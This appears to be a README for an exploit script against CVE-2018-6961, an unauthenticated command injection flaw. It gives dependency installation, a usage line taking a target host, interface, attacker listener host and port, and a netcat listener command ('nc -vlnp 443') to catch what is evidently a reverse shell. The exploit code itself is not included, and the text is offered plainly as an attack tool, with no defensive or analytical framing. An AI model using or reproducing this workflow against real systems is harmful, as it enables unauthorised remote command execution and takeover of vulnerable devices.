**CVE-2018-6961 - UNAUTHENTICATED COMMAND INJECTION VULNERABILITY**

This exploit works in Python2.7 - Not tested in any other version

**1) Install Dependencies**
```
pip install request
```

if don't have pip installed, just run
```
apt-get install python-pip
```

**2) Usage **
```
python exployt.py --rhost --interface --lhost --lport --function
```
```
python exploit.py --rhost 1.1.1.1 --interface ge1 --lhost 2.2.2.2 --lport 443 --function traceroute
Exploiting...................
```

**3) Don't forget to setup the netcat on another terminal**
```
nc -vlnp 443
```



TODO
--improve the script to run the netcat on the same terminal

